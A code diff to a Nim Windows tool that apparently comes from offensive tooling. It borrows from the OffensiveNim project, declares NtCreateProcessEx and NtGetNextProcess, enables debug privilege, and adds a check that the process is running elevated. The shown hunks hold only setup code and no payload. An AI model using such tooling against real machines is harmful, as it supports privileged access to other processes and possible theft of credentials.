@@ -8,29 +8,6 @@ type
     NtCreateProcessEx_t = proc(ProcessHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, ParentProcess: HANDLE, Flags: ULONG, SectionHandle: HANDLE, DebugPort: HANDLE, ExceptionPort: HANDLE, InJob: BOOLEAN): NTSTATUS {.stdcall.}
     NtGetNextProcess_t = proc(ProcessHandle: HANDLE, DesiredAccess: ACCESS_MASK, HandleAttributes: ULONG, Flags: ULONG, NewProcessHandle: PHANDLE): NTSTATUS {.stdcall.}
 
-#[
-bool IsElevatedProcess()
-{
-    bool isElevated;
-    HANDLE token = NULL;
-
-    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token))
-    {
-        TOKEN_ELEVATION elevation;
-        DWORD token_check = sizeof(TOKEN_ELEVATION);
-
-        if (GetTokenInformation(token, TokenElevation, &elevation, sizeof(elevation), &token_check))
-        {
-            isElevated = elevation.TokenIsElevated;
-            cout << "[SUCCESS] Successfully started with elevated privileges" << endl;
-        }
-    }
-
-    if (token) { CloseHandle(token); }
-
-    return isElevated;
-}
-
 proc isElevatedProcess(): bool =
     var isElevated: bool
     var token: HANDLE
@@ -38,11 +15,10 @@ proc isElevatedProcess(): bool =
     if OpenProcessToken(cast[HANDLE](-1), TOKEN_QUERY, addr token) != 0:
         var elevation: TOKEN_ELEVATION
         var token_check: DWORD = cast[DWORD](sizeof TOKEN_ELEVATION)
-        if GetTokenInformation(token, TokenElevation, addr elevation, sizeof elevation, addr token_check):
-            isElevated = elevation.TokenIsElevated
+        if GetTokenInformation(token, tokenElevation, addr elevation, cast[DWORD](sizeof elevation), addr token_check) != 0:
+            isElevated = if elevation.TokenIsElevated != 0: true else: false
     CloseHandle(token)
     return isElevated
-]#
 
 # Appropriated from https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/blockdlls_acg_ppid_spoof_bin.nim
 proc toString(chars: openArray[WCHAR]): string =
@@ -218,6 +194,10 @@ when isMainModule:
         NtGetNextProcess = cast[NtGetNextProcess_t](hNtdll.symAddr("NtGetNextProcess"))
     
     var hToken: HANDLE
+
+    if isElevatedProcess() == false:
+        echo "[-] Process Not Running Elevated!\n[!] Quitting..."
+        quit(1)
 
     echo "[!] Checking for Debug privilege..."
     if OpenProcessToken(cast[HANDLE](-1), TOKEN_ADJUST_PRIVILEGES, addr hToken) != 0 and SetPrivilege(hToken, SE_DEBUG_NAME, TRUE):
